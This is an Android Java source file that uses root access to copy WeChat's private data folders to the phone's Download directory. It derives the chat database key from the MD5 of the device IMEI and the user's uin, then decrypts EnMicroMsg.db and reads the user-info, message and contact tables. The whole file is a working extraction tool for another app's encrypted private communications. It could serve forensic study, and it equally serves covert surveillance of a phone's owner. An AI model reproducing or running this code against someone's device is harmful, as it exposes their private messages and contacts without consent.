package com.getweixinmessage;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Xml;

import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

public class GetMessage {
	public static String IMEI = "IMEI";
	public static String PRE_USERINFO = "PRE_USERINFO";
	public static String PRE_MESSAGE = "PRE_MESSAGE";
	public static String PRE_RCONTACT = "PRE_RECONTACT";
	public static String PRE_UIN = "PRE_UIN";

	public static String TABLE_NAME_USERINFO = "userinfo";
	public static String TABLE_NAME_MESSAGE = "message";
	public static String TABLE_NAME_RCONTACT = "rcontact";

	public static String SILENAME = "SILENAME";
	public static String MSGDATABASE_NAME = "EnMicroMsg.db";

	private static SharedPreferences mSharedPreferences;

	public static Context getContext() {
		return ZeteticApplication.getInstance();
	}

	public static void getSharePreferences() {
		if (mSharedPreferences == null) {
			mSharedPreferences = getContext().getSharedPreferences(SILENAME, Activity.MODE_PRIVATE);
		}
	}

	public static SharedPreferences getSharePreferences(String name) {
		return getContext().getSharedPreferences(name, Activity.MODE_PRIVATE);
	}

	@SuppressLint("MissingPermission")
	public static void setIMEI() {
		getSharePreferences();
		String imei = mSharedPreferences.getString(IMEI, "");
		FLog.v("fq", "set imei = " + imei);
		if (TextUtils.isEmpty(imei)) {
			TelephonyManager mngr = (TelephonyManager) getContext().getSystemService(Context.TELEPHONY_SERVICE);
			SharedPreferences.Editor edit = mSharedPreferences.edit();
			edit.putString(IMEI, mngr.getDeviceId());
			edit.commit();
		}
	}
	
	public static String getIMEI(){
		getSharePreferences();
		String imei = mSharedPreferences.getString(IMEI, "");
		FLog.v("fq","get IMEI="+imei);
		return imei;
	}
	
	public static void setLine(String uin, String key, long line){
		FLog.v("fq","setLine uin="+uin+" key="+key+" = "+line);
		SharedPreferences.Editor edit = getSharePreferences(uin).edit();
		edit.putLong(key, line);
		edit.commit();
	}
	
	public static long getLine(String uin, String key){
		return getSharePreferences(uin).getLong(key, 0);
	}
	
	public static void setPrefer(String key, String val){
		FLog.v("fq","setPrefer  key="+key+" = "+val);
		SharedPreferences.Editor edit = getSharePreferences(SILENAME).edit();
		edit.putString(key, val);
		edit.commit();
	}
	
	public static String getPrefer(String key){
		return getSharePreferences(SILENAME).getString(key, null);
	}
	
	public static String getMD5(String string) {
		byte[] hash;
		try {
			hash = MessageDigest.getInstance("MD5").digest(
					string.getBytes("UTF-8"));
		} catch (NoSuchAlgorithmException e) {
			throw new RuntimeException("Huh, MD5 should be supported?", e);
		} catch (UnsupportedEncodingException e) {
			throw new RuntimeException("Huh, UTF-8 should be supported?", e);
		}
		StringBuilder hex = new StringBuilder(hash.length * 2);
		for (byte b : hash) {
			if ((b & 0xFF) < 0x10)
				hex.append("0");
			hex.append(Integer.toHexString(b & 0xFF));
		}
		return hex.toString();

	}
	
	public static List<String> findAllFile(File dir, String filename, List<String> resList){
		if(resList == null){
			resList = new ArrayList<String>();
		}
		File fileDir = dir;
		if(fileDir!=null && fileDir.isDirectory() && fileDir.list()!=null){
			for(File f : fileDir.listFiles()){
				if(f.isFile() && f.getName().equalsIgnoreCase(filename)){
//					FLog.v("fq","findFile get = "+f.getAbsolutePath());
					resList.add(f.getAbsolutePath());
				}
				if(f.isDirectory()){
					findAllFile(f, filename, resList);
				}
			}
		}
		return resList;
	}
	
	public static boolean getMessage(){
		FLog.v("fq","getMessage ----> "+DateTools.timeStamp2Date(System.currentTimeMillis(), "yyyy-MM-dd HH:mm:ss"));
		if(!RootTools.is_root()){
			FLog.e("fq","device not rooted");
			return false;
		}
		
		String AppFilesDir = Environment.getExternalStorageDirectory().getPath()+File.separator+"Download";
//		String AppFilesDir = "/sdcard"+File.separator+"Download";
		
		File file = new File(AppFilesDir);
		if(!file.exists()){
			FLog.v("fq","there is no "+AppFilesDir);
		}
		file.mkdirs();
		FLog.v("fq","AppFilesDir="+AppFilesDir);
		
		String FileMicroMsg = AppFilesDir+File.separator+"MicroMsg";
		String cmd = "cp -r /data/data/com.tencent.mm/MicroMsg "+AppFilesDir;
		FLog.v("fq","copy-> "+cmd);
		if(!RootTools.runSu(cmd)){  
			FLog.e("fq","copy fail");
			return false;
		}
		
		String FileConfig = AppFilesDir+File.separator+"shared_prefs";
		cmd = "cp -r /data/data/com.tencent.mm/shared_prefs "+AppFilesDir;
		FLog.v("fq","copy-> "+cmd);
		if(!RootTools.runSu(cmd)){
			FLog.e("fq","copy fail");
			return false;
		}
		
		setIMEI();
		String imei = mSharedPreferences.getString(IMEI, "");
		FLog.v("fq","get IMEI="+imei);
		if(TextUtils.isEmpty(imei)){
			FLog.e("fq","get imei fail");
			return false;
		}
		
		//read xml
		File xmlFile = new File(FileConfig+File.separator+"system_config_prefs.xml");
		if(!xmlFile.exists()){
			FLog.e("fq","read xmlFile fail "+xmlFile.toString());
			return false;
		}
		FLog.v("fq","parser  "+xmlFile.toString());
		FLog.v("fq","parser  "+DateTools.timeStamp2Date(xmlFile.lastModified(), "yyyy-MM-dd HH:mm:ss"));
		
		boolean bParse = false;
		int uin=0;
		XmlPullParser parser = Xml.newPullParser(); 
		try {
			FileInputStream inputStream = new FileInputStream(xmlFile); 
			parser.setInput(inputStream, "UTF-8");
			int eventType = parser.getEventType();
			while (uin == 0 && eventType != XmlPullParser.END_DOCUMENT) { 
				switch (eventType) {  
	            case XmlPullParser.START_DOCUMENT:
//	            	FLog.v("fq","parser  START_DOCUMENT");
	                break;  
	            case XmlPullParser.START_TAG://开始读取某个标签  
	                //通过getName判断读到哪个标签，然后通过nextText()获取文本节点值，或通过getAttributeValue(i)获取属性节点值  
	                String name = parser.getAttributeValue(null, "name");
//	                FLog.v("fq",name+"->"+parser.getAttributeValue(null, "value"));
	                String default_uin = "default_uin";
	                if(default_uin.equalsIgnoreCase(name)){
	                	uin = Integer.valueOf(parser.getAttributeValue(null, "value"));
	                	FLog.v("fq","set uin="+uin);
	                }
	                break;  
	            case XmlPullParser.END_TAG:// 结束元素事件  
//	            	FLog.v("fq","parser END_TAG");
	                break;  
	            }  
	            eventType = parser.next();
			}
			inputStream.close();  
			bParse = true;
		} catch (XmlPullParserException e) {
			e.printStackTrace();
		}// 设置数据源编码  
		catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		if(!bParse){
			FLog.e("fq","XmlPullParser fail");
			return false;
		}
        
//		uin=-1887390134;
		if(uin == 0){
			FLog.e("fq","get uin fail ! ");
			String temp = getPrefer(PRE_UIN);
			if(temp==null){
				return false;
			}
			uin = Integer.valueOf(temp);
		}else{
			setPrefer(PRE_UIN,String.valueOf(uin));
		}
		
		String imeiuin = imei+String.valueOf(uin);
		FLog.v("fq","imeiuin="+imeiuin);
		
		String md5 = getMD5(imeiuin);
		FLog.v("fq","md5="+md5);
		
		String keyMd5 = md5.substring(0, 7);
		FLog.v("fq","keyMd5="+keyMd5);
		
		SQLiteDatabase.loadLibs(getContext());
        SQLiteDatabaseHook hook = new SQLiteDatabaseHook(){  
            public void preKey(SQLiteDatabase database){  
            }  
            public void postKey(SQLiteDatabase database){  
                database.rawExecSQL("PRAGMA cipher_migrate;");  //最关键的一句！！！  
            }  
      };
      
		
		File tempFile = new File(FileMicroMsg);
		if (tempFile == null || !tempFile.exists()) {
			FLog.e("fq", "can't get file " + tempFile.toString());
			return false;
		}
		List<String> list = new ArrayList<String>();
		findAllFile(tempFile, MSGDATABASE_NAME, list);
		FLog.v("fq", "findAllFile size=" + list.size());
		for (String s : list) {
			FLog.v("fq", "findAllFile list=" + s);
			
			File databaseFile = new File(s);
			if (!databaseFile.exists()) {
				FLog.e("fq", "databaseFile fail=" + databaseFile.toString());
				return false;
			}
			
			try {
				FLog.i("fq", "start query database");
				SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(
						databaseFile, keyMd5, null, hook);
				//table userinfo 
				Tools.getQuery(uin, db, TABLE_NAME_USERINFO , PRE_USERINFO);
				
				//table message
				Tools.getQuery(uin, db, TABLE_NAME_MESSAGE, PRE_MESSAGE);
				
				//table recontact
				Tools.getQuery(uin, db, TABLE_NAME_RCONTACT, PRE_RCONTACT);
				
				db.close();
			} catch (Exception e) {
				FLog.e("fq","******************\r\n"+ "database read error !"+e.getMessage()+"\r\n******************");
				return false;
			}
			
			FLog.i("fq", "end query database");
		}
      
     
		
		return true;
	}
}
